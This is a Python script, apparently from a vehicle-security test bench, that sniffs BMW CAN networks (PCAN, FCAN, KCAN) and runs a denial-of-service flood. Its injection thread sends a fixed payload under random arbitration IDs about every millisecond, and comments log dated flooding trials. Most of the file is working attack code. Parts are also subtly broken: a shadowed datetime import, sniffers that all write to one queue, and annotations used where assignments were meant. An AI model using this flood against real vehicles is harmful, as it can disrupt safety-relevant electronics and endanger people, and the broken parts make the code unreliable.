#!/usr/bin/env python3

# *** Import libraries
# DBC dissector generated from canmatrix
from custom_layers.bmw_merged import SignalHeader
from bmw_gui_v10 import gui_start                                       # GUI
import sys
import signal
import queue
from datetime import datetime
from can import BLFWriter
from threading import Thread
from scapy.contrib.cansocket import CANSocket
from scapy.layers.can import CAN
from time import sleep, time
from random import randint
from can import rc as can_rc
import datetime
import math
can_rc['interface'] = 'socketcan_ctypes'

# *** Import custom user functions

# *** Global variables

# Arrays for GUI
k_ids_array, p_ids_array, f_ids_array = {}, {}, {}
bridge_net_array, bridge_ecu_array = {}, {}
k_raw_pkts, p_raw_pkts, f_raw_pkts = [], [], []

# Display
sniff = False
disp = False  # True     # set False for no display for good latency
pkt_rate = 1    # display packet update rate: every 1 pkt update rate -> spikes about every 100 messages

# Flooding parameters
# 1.13 * 10**(-3)  # 300 * 10**(-6)  # 30 microseconds
flood_interval = 1 * 10**(-3)
# flood_ID = 0x0A8
flood_ID = 0x080
tgt_ID = 0x1A6

# 0x0A8 - d = bytearray(b'\xE3\xDA\x46\xD2\x46\xF1\x0F\x00')
# 0x0AA - d = bytearray(b'\x2B\x3D\x3E\x8B\x26\x0A\x94\xB4')
# 0x080 - d = same as 0x0A8

flood_msg = bytearray(b'\xE3\xDA\x46\xD2\x46\xF1\x0F\x00')
# PCAN Flooding:
# 1134 - 08A - 5ms
# 1140 - 08A - 2ms
# 10/6/22 A8 -- 300microsecond -- 1358
# 10/6/22 08 -- 300microsecond -- 1409 -- capture starting before attack (expect to see delay increasing)

# KCAN Flooding:
# 10/6/22 A8 -- 1.5ms --1545


# *** Classes


class BLFMsg(object):
    def __init__(self):
        self.channel = 0
        self.dlc = 0
        self.arbitration_id: 0
        self.timestamp: 0
        self.id_type = False
        self.is_extended_id = False
        self.is_remote_frame = False
        self.is_fd = False
        self.bitrate_switch = False
        self.error_state_indicator = False
        self.is_error_frame = False


# Initialise Linux CAN Socket - Note BLF_id = id+1
p_soc, p_id, p_rate = 'can_5', 1, 500000        # id=0 (pcan)
f_soc, f_id, f_rate = 'can_4', 2, 500000        # id=1 (fcan)
k_soc, k_id, k_rate = 'can_6', 3, 100000        # id=2 (kcan)
# id=3 (bridge), b_rate depends on which network
b_soc, b_id = 'can_7', 4
d_soc, d_id, d_rate = 'can0', 5, 500000         # id=4 (dcan)

# Open Linux CAN Socket - Note BLF_id = id+1
pcan_socket = CANSocket(channel=p_soc, bitrate=p_rate,
                        receive_own_messages=True)           # pcan
fcan_socket = CANSocket(channel=f_soc, bitrate=f_rate,
                        receive_own_messages=True)           # fcan
kcan_socket = CANSocket(channel=k_soc, bitrate=k_rate,
                        receive_own_messages=True)           # kcan

# Bridge parameters
# PCAN = 'can_5', 0, 500000 / FCAN = 'can_4', 1, 500000 / KCAN = 'can_6', 2, 100000
# net_can, net_id, net_br = p_soc, p_id, p_rate
net_can, net_id, net_br = k_soc, k_id, k_rate
# always can_7 and 3, except br = 500000 for PCAN and FCAN, br = 100000 for KCAN
bridge_can, bridge_id, bridge_br = b_soc, b_id, net_br
# inject_socket = CANSocket(
#     channel=net_can, bitrate=net_br, receive_own_messages=False)
inject_socket = CANSocket(
    channel=bridge_can, bitrate=bridge_br, receive_own_messages=False)

# *** Define signal handler to stop this program


def signal_handler(sig, frame):

    print('\nYou pressed Ctrl+C!')

    if sniff:
        # Clear queues
        q_cm.join()
        q_cn.join()
        q_ce.join()

        # Stop writer
        writer_cm.stop()
        writer_ce.stop()
        writer_cn.stop()

        print("Sniffer stopped")
    sys.exit(0)                                 # End program

# *** Define workers for queue - writetofile


def worker_cm():
    msg = BLFMsg()
    while True:
        [p_id, p_time, p_len, p_data, can_nbr] = q_cm.get()
        msg.channel = can_nbr
        msg.arbitration_id = p_id
        msg.timestamp = p_time
        msg.dlc = p_len
        msg.data = p_data
        writer_cm.on_message_received(msg)
        q_cm.task_done()


def worker_cn():
    msg = BLFMsg()
    while True:
        [p_id, p_time, p_len, p_data, can_nbr] = q_cn.get()
        msg.channel = can_nbr
        msg.arbitration_id = p_id
        msg.timestamp = p_time
        msg.dlc = p_len
        msg.data = p_data
        writer_cn.on_message_received(msg)
        q_cn.task_done()


def worker_ce():
    msg = BLFMsg()
    while True:
        [p_id, p_time, p_len, p_data, can_nbr] = q_ce.get()
        msg.channel = can_nbr
        msg.arbitration_id = p_id
        msg.timestamp = p_time
        msg.dlc = p_len
        msg.data = p_data
        writer_ce.on_message_received(msg)
        q_ce.task_done()

# *** Panel display


def msg_display(pkt, ids_array, raw_pkts, pkt_counter):

    # Try to decoded CAN frame from generated DBC layer (bmw_merged.py)
    decoded_pkt = SignalHeader(bytes(pkt))

    # Fill IDs array (ids_array)
    if pkt.identifier not in ids_array:
        ids_array[pkt.identifier] = [
            decoded_pkt.summary(), decoded_pkt, pkt, 1]
    else:
        count = ids_array[pkt.identifier][3]
        ids_array[pkt.identifier] = [
            decoded_pkt.summary(), decoded_pkt, pkt, count + 1]

    # # Fill temporary array of packets, limit to 18 (raw_pkts_array)
    raw_pkts.append([pkt_counter, pkt.identifier, bytes(pkt)])
    if len(raw_pkts) > 18:
        raw_pkts.pop(0)

# *** Sniffers


def p_sniffer():
    pcan_counter = 0
    while True:
        # Receive can frame
        pkt = pcan_socket.recv()
        q_cm.put_nowait([pkt.identifier, pkt.time, pkt.length, pkt.data, p_id])
        pcan_counter += 1                                       # Increase packet counter
        if pcan_counter % pkt_rate == 0 and disp:  # Setting for update every pkt
            msg_display(pkt, p_ids_array, p_raw_pkts, pcan_counter)


def f_sniffer():
    fcan_counter = 0
    while True:
        # Receive can frame
        pkt = fcan_socket.recv()
        q_cm.put_nowait([pkt.identifier, pkt.time, pkt.length, pkt.data, f_id])
        fcan_counter += 1                                       # Increase packet counter
        if fcan_counter % pkt_rate == 0 and disp:  # Setting for update every pkt
            msg_display(pkt, f_ids_array, f_raw_pkts, fcan_counter)


def k_sniffer():
    kcan_counter = 0
    while True:
        # Receive can frame
        pkt = kcan_socket.recv()
        q_cm.put_nowait([pkt.identifier, pkt.time, pkt.length, pkt.data, k_id])
        kcan_counter += 1                                       # Increase packet counter
        if kcan_counter % pkt_rate == 0 and disp:  # Setting for update every pkt
            msg_display(pkt, k_ids_array, k_raw_pkts, kcan_counter)

# *** Define Injection thread for network


def inject_net():

    pkt_counter = 0
    pkt = CAN()
    pkt.identifier = flood_ID
    pkt.data = flood_msg
    pkt.len = len(flood_msg)

    while True:

        pkt_counter += 1
        # pkt.time = time()
        inject_socket.send(pkt)
        pkt.identifier = randint(0x80, tgt_ID)
        start = datetime.datetime.now()
        print(pkt.identifier, start, bytes(pkt))
        while True:
            end = datetime.datetime.now()
            diff = (end-start).microseconds
            # Convert flood_interval to microsecond
            if diff > (flood_interval * 10**6):
                break

# **** Main Program ***


# Install signal for program exit
signal.signal(signal.SIGINT, signal_handler)

try:

    # GUI interface Comment out if need for good latency
    if disp:
        gui_start(k_ids_array, p_ids_array, f_ids_array, k_raw_pkts,
                  p_raw_pkts, f_raw_pkts, bridge_net_array, bridge_ecu_array)

    if sniff:

        # logging files name
        now = datetime.now()
        date_time = now.strftime("%Y%m%d%H%M")
        dataFolder = './data/'
        cmFile = dataFolder+'cm'+date_time+'.blf'
        cnFile = dataFolder+'cn'+date_time+'.blf'
        ceFile = dataFolder+'ce'+date_time+'.blf'

        # Initialise BLF writer
        writer_cm = BLFWriter(cmFile)
        writer_cn = BLFWriter(cnFile)
        writer_ce = BLFWriter(ceFile)
        writer_cm.start_timestamp = 0
        writer_cn.start_timestamp = 0
        writer_ce.start_timestamp = 0
        writer_cm.COMPRESSION_LEVEL = 9
        writer_cn.COMPRESSION_LEVEL = 9
        writer_ce.COMPRESSION_LEVEL = 9

        # Initialise queue to write to file
        q_cm = queue.Queue()
        q_cn = queue.Queue()
        q_ce = queue.Queue()

        # Turn-on the workers thread to write to file
        Thread(target=worker_cm, daemon=True).start()
        Thread(target=worker_cn, daemon=True).start()
        Thread(target=worker_ce, daemon=True).start()

        # Start sniffer thread
        Thread(target=p_sniffer, daemon=True).start()
        Thread(target=f_sniffer, daemon=True).start()
        Thread(target=k_sniffer, daemon=True).start()

    # Start attack
    Thread(target=inject_net, daemon=True).start()

    while True:
        sleep(50000)

except KeyboardInterrupt:
    print("\nSniffer stopped")
